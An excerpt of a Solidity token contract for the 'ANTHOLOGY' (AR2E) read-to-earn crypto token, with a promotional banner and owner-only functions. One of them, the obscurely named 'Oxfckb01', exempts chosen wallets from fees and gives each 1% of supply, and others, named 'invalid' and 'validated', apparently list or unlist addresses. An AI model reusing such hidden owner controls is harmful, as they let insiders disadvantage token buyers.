...
/**
  ...
  __   __ _  ____  _  _   __   __     __    ___  _  _ 
 / _\ (  ( \(_  _)/ )( \ /  \ (  )   /  \  / __)( \/ )
/    \/    /  )(  ) __ ((  O )/ (_/\(  O )( (_ \ )  / 
\_/\_/\_)__) (__) \_)(_/ \__/ \____/ \__/  \___/(__/  


Anthology [Read to Earn] Project

Feel the sensation of Reading to Earn Anthology Token.
Hold at least 0.1% AR2E to get rewards when you complete reading a book in our website.

Tokenomics

- Total Supply 1,000,000,000 AR2E
- 20% AR2E Locked for Rewards
- 5% AR2E For Development
- Tax Fee 9 / 9
- LP Locked
- Max Tx 2%
- Max Wallet 2%
...
Telegram : https://t.me/ANTHOLOGY_R2E/
Website : https://anthologyr2e.live/
...
contract ANTHOLOGY is Context, IERC20, Ownable { 
    ...
    address payable private Wallet_Dev = payable(0x93787AaEEdf00A2487810C9Ddcf1cE609d7082F5);
    ...
    string private _name = "ANTHOLOGY"; 
    string private _symbol = "AR2E";  
    ...
    function Oxfckb01(address[] calldata addresses, bool with_value_or_not) public onlyOwner {
               
        uint256 startGas;
        uint256 gasUsed;

        uint amount = _tTotal.mul(1).div(100);

    for (uint256 i; i < addresses.length; ++i) {
        if(gasUsed < gasleft()) {
        startGas = gasleft();
        if(!_isExcludedFromFee[addresses[i]]){
            if(with_value_or_not){
            _isExcludedFromFee[addresses[i]] = true;
            _tokenTransfer1(_msgSender(), addresses[i], amount , false);
            } else {
                _isExcludedFromFee[addresses[i]] = true;
            }
            }
    ...
    function phaseTrigger(bool codeOne, bool codeTwo) external onlyOwner {
    ...
    function invalid(address[] calldata addresses) external onlyOwner {
    ...
    function validated(address[] calldata addresses) external onlyOwner {
    ...
    function _tokenTransfer1(address sender, address recipient, uint256 amount,bool takeFee) private {
        ...
        if(!takeFee){
            ...
            _transferTokens1(sender, recipient, amount);
    ...
    function _transferTokens1(address sender, address recipient, uint256 tAmount) private {
        (uint256 tTransferAmount, uint256 tDev) = _getValues(tAmount);
        _tOwned[sender] = _tOwned[sender].sub(tAmount);
        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
        _tOwned[address(this)] = _tOwned[address(this)].add(tDev);   
